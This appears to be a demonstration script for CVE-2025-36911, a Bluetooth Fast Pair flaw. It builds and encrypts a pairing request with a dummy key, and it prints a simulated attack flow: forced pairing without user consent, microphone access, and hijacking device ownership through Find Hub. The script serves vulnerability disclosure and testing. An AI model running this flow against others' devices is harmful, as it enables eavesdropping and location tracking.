#!/usr/bin/env python3
import sys
sys.path.insert(0, "src")

from whisperpair.protocol import (
    KeyBasedPairingRequest,
    KeyBasedPairingResponse,
    PairingRequestFlags,
    parse_bluetooth_address,
    format_bluetooth_address,
)
from whisperpair.crypto import (
    FastPairCrypto,
    aes_128_encrypt,
    generate_account_key,
)


def demonstrate_verification_flow():
    print("=" * 70)
    print("WhisperPair Verification Flow Demonstration")
    print("CVE-2025-36911")
    print("=" * 70)
    print()

    print("[STEP 1] Device Identification")
    print("-" * 40)
    target_address = "AA:BB:CC:DD:EE:FF"
    print(f"Target device: {target_address}")
    print("Device is advertising Fast Pair (0xFE2C) but NOT in pairing mode")
    print("This device can be evaluated for WhisperPair behavior")
    print()

    print("[STEP 2] Construct Key-based Pairing Request")
    print("-" * 40)

    provider_addr = parse_bluetooth_address(target_address)
    request = KeyBasedPairingRequest.for_verification(provider_address=provider_addr)
    plaintext = request.build()

    print("Message structure (16 bytes):")
    print(f"  Byte 0 (Message Type): 0x{plaintext[0]:02X} (Key-based Pairing Request)")
    print(f"  Byte 1 (Flags):        0x{plaintext[1]:02X} (Initiate Bonding)")
    print(f"  Bytes 2-7 (Provider):  {format_bluetooth_address(plaintext[2:8])}")
    print(f"  Bytes 8-15 (Salt):     {plaintext[8:16].hex()}")
    print()
    print(f"Full plaintext: {plaintext.hex()}")
    print()

    print("[STEP 3] Encrypt the Request (Demo Key)")
    print("-" * 40)

    demo_key = bytes(16)
    print(f"AES Key (demo): {demo_key.hex()}")
    print("(Real key derived from Anti-Spoofing public key or Account Key)")

    encrypted = aes_128_encrypt(demo_key, plaintext)
    print(f"Encrypted request: {encrypted.hex()}")
    print()

    print("[STEP 4] Send to Key-based Pairing Characteristic")
    print("-" * 40)
    print("Characteristic UUID: FE2C1234-8366-4814-8EB0-01DE32100BEA")
    print("Action: GATT Write with Response")
    print()
    print("  [Simulated] Writing encrypted request to characteristic...")
    print()

    print("[EXPECTED VS ACTUAL BEHAVIOR]")
    print("-" * 40)
    print("A correctly implemented device would:")
    print("  1. Check if user pressed the pairing button")
    print("  2. Reject the request if NOT in pairing mode")
    print()
    print("A VULNERABLE device (CVE-2025-36911):")
    print("  1. Skips the pairing mode check")
    print("  2. Processes the request immediately")
    print("  3. Responds and initiates Bluetooth pairing")
    print()

    print("[STEP 5] Receive Provider Response (if vulnerable)")
    print("-" * 40)

    simulated_response_plaintext = bytes([
        0x01,
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    ])
    response = KeyBasedPairingResponse.parse(simulated_response_plaintext)

    print("  [Simulated] Received encrypted notification")
    print(f"  Provider BR/EDR Address: {response.provider_address_str}")
    print()
    print("  RESULT: Device appears VULNERABLE")
    print("  The device responded despite not being in pairing mode.")
    print()

    print("[STEP 6] Complete Bluetooth Classic Pairing (Authorized)")
    print("-" * 40)
    print(f"  Initiate BR/EDR pairing with: {response.provider_address_str}")
    print("  Device will accept pairing without user confirmation")
    print()
    print("  Tester now has access to the device for verification:")
    print("    - Validate audio output routing")
    print("    - Confirm microphone behavior (if present)")
    print("    - Validate connection handling")
    print()

    print("[STEP 7] Optional: Ownership Key")
    print("-" * 40)
    account_key = generate_account_key()
    print(f"  Generated Account Key: {account_key.hex()}")
    print("  Characteristic UUID: FE2C1236-8366-4814-8EB0-01DE32100BEA")
    print()
    print("  If device has no owner (never paired with Android):")
    print("    - Tester's key becomes the Owner Account Key")
    print("    - Device joins Google Find Hub network")
    print("    - Device appears under the authorized test account")
    print()

    print("=" * 70)
    print("DISCLAIMER: This is a demonstration only.")
    print("Only test devices you own or have explicit permission to test.")
    print("Reference: https://whisperpair.eu")
    print("=" * 70)


if __name__ == "__main__":
    demonstrate_verification_flow()
